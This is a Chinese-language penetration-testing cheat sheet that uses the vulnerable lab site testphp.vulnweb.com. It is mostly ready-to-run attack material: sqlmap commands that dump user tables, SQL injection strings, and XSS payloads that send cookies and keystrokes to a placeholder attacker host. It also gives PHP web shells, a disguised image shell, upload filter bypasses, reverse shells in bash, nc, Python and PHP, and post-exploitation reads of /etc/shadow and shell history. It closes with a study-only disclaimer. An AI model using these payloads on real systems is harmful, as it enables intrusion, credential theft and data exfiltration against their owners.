
---

# Web 安全三件套 - 完整公式手册

> **靶场地址**：http://testphp.vulnweb.com

---

## 目录

- [第一部分：信息收集（找隐藏目录）](#第一部分信息收集找隐藏目录)
- [第二部分：SQL注入探测](#第二部分sql注入探测)
- [第三部分：Burp Suite 中间人拦截](#第三部分burp-suite-中间人拦截)
- [第四部分：常用字典路径](#第四部分常用字典路径)
- [第五部分：完整攻击链（一条龙）](#第五部分完整攻击链一条龙)
- [第六部分：Nmap 端口扫描](#第六部分nmap-端口扫描)
- [第七部分：Nikto 漏洞扫描](#第七部分nikto-漏洞扫描)
- [第八部分：XSS 探测](#第八部分xss-探测)
- [第九部分：文件上传漏洞](#第九部分文件上传漏洞)
- [第十部分：提权与后渗透](#第十部分提权与后渗透)
- [附录：速查卡片](#附录速查卡片)

---

## 第一部分：信息收集（找隐藏目录）

### 1.1 dirb（经典目录扫描器）
```bash
# 基础扫描
dirb http://目标.com

# 使用自定义字典
dirb http://目标.com /path/to/wordlist.txt

# 使用指定扩展名
dirb http://目标.com -X .php,.txt,.bak

# 套用靶场
dirb http://testphp.vulnweb.com
```

### 1.2 gobuster（更现代，更快）
```bash
# 目录扫描（最常用）
gobuster dir -u http://目标.com -w /usr/share/wordlists/dirb/common.txt

# 指定扩展名
gobuster dir -u http://目标.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak

# 状态码过滤（只显示 200, 301, 302）
gobuster dir -u http://目标.com -w /usr/share/wordlists/dirb/common.txt -s "200,301,302"

# 隐藏特定状态码（如 404）
gobuster dir -u http://目标.com -w /usr/share/wordlists/dirb/common.txt -b "404"

# DNS 子域名枚举
gobuster dns -d example.com -w /usr/share/wordlists/dirb/common.txt

# 套用靶场
gobuster dir -u http://testphp.vulnweb.com -w /usr/share/wordlists/dirb/common.txt -x php
```

### 1.3 dirbuster（图形化界面，Kali 自带）
```bash
# 启动
dirbuster

# 常用设置
# - URL: http://testphp.vulnweb.com
# - Wordlist: /usr/share/wordlists/dirb/common.txt
# - File extension: php
# - Threads: 10-20（根据机器性能调整）
```

### 1.4 wfuzz（模糊测试神器）
```bash
# 目录爆破
wfuzz -w /usr/share/wordlists/dirb/common.txt http://目标.com/FUZZ

# 带扩展名
wfuzz -w /usr/share/wordlists/dirb/common.txt http://目标.com/FUZZ.php

# 过滤响应码（排除 404）
wfuzz -w wordlist.txt --hc 404 http://目标.com/FUZZ
```

### 1.5 ffuf（最快的 Go 语言扫描器）
```bash
# 安装
go install github.com/ffuf/ffuf/v2@latest

# 目录扫描
ffuf -u http://目标.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# 带扩展名和过滤
ffuf -u http://目标.com/FUZZ -w wordlist.txt -e .php,.html -fc 404
```

---

## 第二部分：SQL注入探测

### 2.1 sqlmap 基础用法
```bash
# 检测注入点
sqlmap -u "http://目标.com/页面.php?id=1" --batch

# 自动检测并获取数据库信息
sqlmap -u "http://目标.com/页面.php?id=1" --banner --batch

# 指定注入类型（GET/POST）
sqlmap -u "http://目标.com/页面.php?id=1" --method=GET
sqlmap -u "http://目标.com/login.php" --data="user=admin&pass=123" --method=POST
```

### 2.2 数据获取流程
```bash
# Step 1: 列出所有数据库
sqlmap -u "http://目标.com/页面.php?id=1" --dbs

# Step 2: 列出指定数据库的所有表
sqlmap -u "http://目标.com/页面.php?id=1" -D 数据库名 --tables

# Step 3: 列出指定表的所有列
sqlmap -u "http://目标.com/页面.php?id=1" -D 数据库名 -T 表名 --columns

# Step 4: 导出表数据（拿用户名密码）
sqlmap -u "http://目标.com/页面.php?id=1" -D 数据库名 -T 表名 --dump

# Step 5: 只导出特定列
sqlmap -u "http://目标.com/页面.php?id=1" -D 数据库名 -T 表名 -C "username,password" --dump
```

### 2.3 高级功能
```bash
# 获取数据库当前用户
sqlmap -u "http://目标.com/页面.php?id=1" --current-user

# 获取当前数据库名
sqlmap -u "http://目标.com/页面.php?id=1" --current-db

# 判断数据库管理员权限
sqlmap -u "http://目标.com/页面.php?id=1" --is-dba

# 获取所有用户
sqlmap -u "http://目标.com/页面.php?id=1" --users

# 搜索特定表名
sqlmap -u "http://目标.com/页面.php?id=1" --search -T user

# 绕过 WAF
sqlmap -u "http://目标.com/页面.php?id=1" --tamper=space2comment

# 使用代理（配合 Burp 查看流量）
sqlmap -u "http://目标.com/页面.php?id=1" --proxy="http://127.0.0.1:8080"

# 从请求文件加载
sqlmap -r request.txt
```

### 2.4 套用靶场示例
```bash
# 检测注入
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch

# 列出数据库
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs

# 假设查到数据库名 acuart
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables

# 假设查到表名 users
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump
```

### 2.5 手动 SQL 注入探测（绕过基础防护）
```bash
# 经典单引号测试
' OR '1'='1
' OR 1=1 --
" OR "1"="1
') OR ('1'='1

# 联合查询
' UNION SELECT 1,2,3 --
' UNION SELECT null,username,password FROM users --

# 报错注入
' AND extractvalue(1,concat(0x7e,database())) --
' AND updatexml(1,concat(0x7e,database()),1) --

# 布尔盲注
' AND SUBSTRING(database(),1,1)='a' --
' AND ASCII(SUBSTRING(database(),1,1)) > 64 --

# 时间盲注
' AND SLEEP(5) --
' AND BENCHMARK(1000000,MD5(1)) --
```

---

## 第三部分：Burp Suite 中间人拦截

### 3.1 启动与基本配置
```bash
# 命令行启动
burpsuite

# 或通过 Kali 菜单
# Applications → 03 - Web Application Analysis → burpsuite
```

### 3.2 代理设置
```
# Burp 默认代理地址
Proxy → Options → 127.0.0.1:8080

# 浏览器代理设置（Firefox）
设置 → 网络设置 → 手动代理配置
HTTP 代理: 127.0.0.1
端口: 8080

# 或使用 FoxyProxy 插件快速切换
```

### 3.3 拦截功能
```bash
# 开启拦截
Proxy → Intercept → Intercept is on

# 修改请求
在 Raw 或 Params 标签页修改参数 → Forward

# 丢弃请求
Drop

# 关闭拦截（放行所有流量）
Intercept is off
```

### 3.4 常用功能模块

| 模块 | 用途 |
|------|------|
| **Proxy** | 拦截/修改 HTTP 请求和响应 |
| **Repeater** | 重放请求（手动测试注入点） |
| **Intruder** | 自动化暴力破解（爆破密码、目录、参数） |
| **Decoder** | 编码/解码（URL、Base64、HTML 等） |
| **Comparer** | 比较两份请求/响应的差异 |
| **Target** | 站点地图和攻击面分析 |
| **Scanner** | 自动化漏洞扫描（专业版） |
| **Extensions** | 插件扩展（如 CO2、Turbo Intruder） |

### 3.5 Intruder 常用攻击类型
```bash
# Sniper（狙击手）- 单字典多位置
最适合测试单个漏洞点

# Battering ram（攻城锤）- 单字典所有位置使用相同值
适合测试多个参数使用相同值

# Pitchfork（叉子）- 多字典一一对应
适合用户名/密码配对爆破

# Cluster bomb（集束炸弹）- 多字典笛卡尔积
适合穷举爆破（较慢）
```

### 3.6 常用 Payload 类型
```bash
# 字典文件
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/common.txt

# 自定义数字范围
1-100
0-999

# 自定义字符串
admin,root,user,test,guest

# 编码（URL 编码、Base64 等）
```

---

## 第四部分：常用字典路径

### 4.1 Kali 自带字典
```bash
# 目录爆破常用
/usr/share/wordlists/dirb/common.txt      # 常用目录（约 4612 条）
/usr/share/wordlists/dirb/big.txt          # 更大的目录字典
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  # 大规模目录

# 密码爆破
/usr/share/wordlists/rockyou.txt.gz        # 经典密码字典（需解压）
/usr/share/wordlists/fasttrack.txt         # FastTrack 密码
/usr/share/wordlists/fern-wifi/common.txt  # WiFi 常用密码

# 子域名
/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# 参数模糊测试
/usr/share/wordlists/wfuzz/Injections/All_attack.txt
```

### 4.2 解压 rockyou 字典
```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

### 4.3 常用第三方字典（Seclists）
```bash
# 安装 Seclists（更全面的字典集合）
sudo apt install seclists

# 字典位置
/usr/share/seclists/
├── Discovery/
│   ├── Web_Content/          # Web 内容发现
│   ├── DNS/                   # DNS 子域名
│   └── Infrastructure/        # 基础设施
├── Passwords/                 # 密码字典
├── Usernames/                 # 用户名字典
├── Fuzzing/                   # 模糊测试
└── IOCs/                      # 威胁情报
```

### 4.4 自定义字典生成
```bash
# 基于名称生成密码
cewl http://目标.com -w custom_passwords.txt

# 生成数字字典
seq 1 1000 > numbers.txt
crunch 4 8 0123456789 -o passwords.txt

# 生成组合字典
cat names.txt surnames.txt > combined.txt
```

---

## 第五部分：完整攻击链（一条龙）

### 5.1 靶场完整攻击流程
```bash
# 假设目标：http://testphp.vulnweb.com/artists.php?artist=1

# Step 1: 扫描目录
gobuster dir -u http://testphp.vulnweb.com -w /usr/share/wordlists/dirb/common.txt -x php

# Step 2: 探测注入点
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch

# Step 3: 列出所有数据库
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs

# Step 4: 列出指定数据库的所有表（假设数据库名 acuart）
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables

# Step 5: 导出表数据（假设表名 users）
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump

# 搞定！用户名和密码被打印出来
```

### 5.2 自动化一键脚本
```bash
#!/bin/bash
# sql_auto.sh - 自动化 SQL 注入攻击脚本

TARGET_URL="http://testphp.vulnweb.com/artists.php?artist=1"

echo "[*] 正在扫描目录..."
gobuster dir -u http://testphp.vulnweb.com -w /usr/share/wordlists/dirb/common.txt

echo "[*] 正在检测 SQL 注入..."
sqlmap -u "$TARGET_URL" --batch

echo "[*] 正在获取数据库..."
sqlmap -u "$TARGET_URL" --dbs

echo "[*] 正在获取表..."
sqlmap -u "$TARGET_URL" -D acuart --tables

echo "[*] 正在导出数据..."
sqlmap -u "$TARGET_URL" -D acuart -T users --dump
```

---

## 第六部分：Nmap 端口扫描

### 6.1 基础扫描
```bash
# 快速扫描（常用端口）
nmap -T4 -F 目标IP

# 全端口扫描（慢但全面）
nmap -p- 目标IP

# 服务版本探测
nmap -sV -p 80,443 目标IP

# 操作系统检测
nmap -O 目标IP

# 全面扫描（版本+系统+脚本）
nmap -A 目标IP
```

### 6.2 脚本扫描
```bash
# Web 服务探测
nmap --script=http-enum 目标IP
nmap --script=http-headers 目标IP

# 漏洞扫描
nmap --script=vuln 目标IP

# 特定漏洞
nmap --script=http-sql-injection 目标IP
nmap --script=http-xss 目标IP
```

---

## 第七部分：Nikto 漏洞扫描

```bash
# 基础扫描
nikto -h http://目标.com

# 指定端口
nikto -h http://目标.com -p 8080

# 使用代理
nikto -h http://目标.com -proxy 127.0.0.1:8080

# 更新数据库
nikto -update

# 套用靶场
nikto -h http://testphp.vulnweb.com
```

---

## 第八部分：XSS 探测

### 8.1 手动测试 Payload
```bash
# 基础反射型 XSS
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>

# 绕过过滤
<scr<script>ipt>alert(1)</scr</script>ipt>
<IMG SRC=javascript:alert(1)>
<svg onload=alert(1)>

# 获取 Cookie
<script>alert(document.cookie)</script>
<script>fetch('http://攻击者.com/steal?cookie='+document.cookie)</script>

# 键盘记录
<script>
document.onkeypress = function(e) {
    fetch('http://攻击者.com/keylog?key=' + e.key);
}
</script>
```

### 8.2 XSS 工具
```bash
# XSStrike（自动化 XSS 检测）
git clone https://github.com/s0md3v/XSStrike.git
python3 xsstrike.py -u "http://目标.com/页面?参数=test"

# dalfox（快速 XSS 扫描）
go install github.com/hahwul/dalfox/v2@latest
dalfox url "http://目标.com/页面?参数=test"
```

---

## 第九部分：文件上传漏洞

### 9.1 测试 Payload
```bash
# PHP 一句话木马
<?php @eval($_POST['cmd']); ?>

# 中国菜刀一句话
<?php @eval($_POST['password']); ?>

# 更隐蔽的变种
<?php @eval(base64_decode($_POST['cmd'])); ?>

# 图片马（伪装成图片）
GIF89a
<?php @eval($_POST['cmd']); ?>
```

### 9.2 绕过技巧
```bash
# 双扩展名
shell.php.jpg
shell.php.png

# 大小写
shell.PHP
shell.PhP

# 空字节截断（已过时）
shell.php%00.jpg

# Content-Type 绕过
Content-Type: image/jpeg

# 前端绕过（禁用 JS 或拦截修改）
```

---

## 第十部分：提权与后渗透

### 10.1 反向 Shell
```bash
# Bash
bash -i >& /dev/tcp/攻击者IP/端口 0>&1

# Netcat
nc -e /bin/bash 攻击者IP 端口

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("攻击者IP",端口));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("攻击者IP",端口);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### 10.2 监听与交互
```bash
# 监听端口（攻击者机器）
nc -lvnp 端口

# 升级为完整交互式 Shell
python -c 'import pty; pty.spawn("/bin/bash")'
# 然后 Ctrl+Z，再执行
stty raw -echo; fg
```

### 10.3 信息收集（Linux）
```bash
# 系统信息
uname -a
cat /etc/os-release
id
whoami

# 网络信息
ifconfig / ip a
netstat -tulnp
route -n

# 敏感文件
cat /etc/passwd
cat /etc/shadow (需要 root)
find / -name "*.conf" 2>/dev/null

# 历史命令
cat ~/.bash_history
history
```

### 10.4 信息收集（Windows）
```cmd
# 系统信息
systeminfo
whoami
net user

# 网络信息
ipconfig /all
netstat -ano

# 敏感文件
dir /s *.txt *.conf *.ini
findstr /si password *.txt *.xml
```

---

## 附录：速查卡片

### 信息收集速查
| 工具 | 命令 |
|------|------|
| dirb | `dirb http://目标.com` |
| gobuster | `gobuster dir -u http://目标.com -w wordlist.txt` |
| ffuf | `ffuf -u http://目标.com/FUZZ -w wordlist.txt` |
| nmap | `nmap -A 目标IP` |
| nikto | `nikto -h http://目标.com` |

### SQL 注入速查
| 操作 | 命令 |
|------|------|
| 检测注入 | `sqlmap -u URL --batch` |
| 列出数据库 | `sqlmap -u URL --dbs` |
| 列出表 | `sqlmap -u URL -D 数据库 --tables` |
| 导出数据 | `sqlmap -u URL -D 数据库 -T 表名 --dump` |
| 绕过 WAF | `sqlmap -u URL --tamper=space2comment` |

### Burp Suite 快捷键
| 快捷键 | 功能 |
|------|------|
| Ctrl+I | 发送到 Intruder |
| Ctrl+R | 发送到 Repeater |
| Ctrl+D | 发送到 Decoder |
| Ctrl+C | 发送到 Comparer |
| Ctrl+Shift+U | URL 编码 |
| Ctrl+Shift+H | HTML 编码 |
| Ctrl+Shift+B | Base64 编码 |

### 常用 Keyevent（Android 测试）
| 按键 | 代码 |
|------|------|
| Home | 3 |
| 返回 | 4 |
| 电源 | 26 |
| 音量+ | 24 |
| 音量- | 25 |
| 拍照 | 27 |
| 点亮屏幕 | 224 |

---

> **免责声明**：本文档仅用于学习目的，请勿用于非法用途。未经授权对他人系统进行测试属于违法行为。